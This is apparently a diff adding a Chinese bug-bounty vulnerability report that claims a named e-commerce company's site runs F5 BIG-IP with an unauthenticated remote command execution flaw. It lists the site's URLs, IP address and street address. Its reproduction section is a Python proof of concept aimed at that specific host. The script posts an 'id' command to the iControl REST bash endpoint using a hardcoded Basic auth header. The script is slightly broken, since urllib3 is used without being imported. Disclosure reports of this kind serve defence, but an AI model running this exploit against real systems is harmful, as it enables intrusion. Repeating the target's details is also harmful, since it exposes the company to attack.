@@ -1,0 +1,43 @@
+厂商名称：广东金秋电子商务有限公司
+所属SRC：互联网空间-亿万守护计划
+漏洞标题：xxx网站存在远程命令执行漏洞
+漏洞类别：web
+漏洞类型: 事件型
+利用通用漏洞：是
+组件名称：F5 BIG-IP 16.0.0-16.0.1 ，F5 BIG-IP 15.1.0-15.1.2，F5 BIG-IP 14.1.0-14.1.3.1，F5 BIG-IP 13.1.0-13.1.3.5，F5 BIG-IP 12.1.0-12.1.5.2，F5 BIG-IQ 7.1.0-7.1.0.2，F5 BIG-IQ 7.0.0-7.0.0.1，F5 BIG-IQ 6.0.0-6.1.0
+漏洞等级：严重
+漏洞url：http://vip.jinqiuds.com:3307 http://jinqiuds.com:3307 http://m.shengqianzhan.net:3307 http://www.jinqiuds.com:3307
+网站名称：广东金秋电子商务有限公司
+网站ip：123.207.23.211
+所属地区：梅州市梅江区丽都西路12号
+漏洞描述：F5 BIG-IP/BIG-IQ iControl REST 未授权远程代码执行漏洞中，未经身份验证的攻击者可通过iControl REST接口，构造恶意请求，执行任意系统命令。
+公司业务：网上销售产品、软件开发与设计、网络工程、企业信息化管理、网站设计与开发、网页制作、通信系统开发集成、电子商务、自动化控制系统开发与集成、技术咨询服务与培训；网上销售食品、化妆品、日用百货、家用电器、服装鞋帽、文体用品、户外活动用品；电子产品销售，钟表与计时仪器销售。(依法须经批准的项目，经相关部门批准后方可开展经营活动)
+复现步骤：
+# -*- coding: UTF-8 -*-
+import requests
+
+host = 'http://123.207.23.211:3307'
+if host[-1] == '/':
+    host = host[:-1]
+
+def poc(target_url):
+    check_url = target_url + '/mgmt/tm/util/bash'
+    headers = {
+        'Authorization': 'Basic YWRtaW46MTIzNDU2N3F3ZXJ0',
+        'X-F5-Auth-Token': ''
+    }
+    data = """{"command":"run","utilCmdArgs":"-c id"}"""
+    try:
+        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+        r_test = requests.post(check_url, headers=headers, data=data, verify=False)
+        if r_test.status_code == 200 and 'uid=0' in r_test.text and 'gid' in r_test.text:
+            # set info['LEVEL']:str and info['vulnable']:int as the return
+            print('严重')
+        elif r_test.status_code == 200 and 'uid' in r_test.text and 'gid' in r_test.text:
+            print('高危')
+    except:
+        print('error {0}'.format(target_url))
+
+poc(host)
+        
+修复方案：升级版本
